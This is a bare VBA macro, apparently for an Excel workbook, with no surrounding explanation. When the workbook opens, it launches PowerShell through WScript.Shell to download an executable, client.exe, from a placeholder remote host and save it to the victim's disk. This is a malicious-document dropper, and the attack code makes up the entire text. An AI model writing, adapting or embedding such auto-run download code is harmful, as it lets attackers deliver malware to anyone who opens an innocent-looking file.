Private Sub Workbook_open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    Dim psCmd As String
    psCmd = "powershell -Command iwr -uri http://remote-ip:remote-port/client.exe -Outfile C:/path/to/save/client.exe"
    shell.Run psCmd, 1, True
End Sub
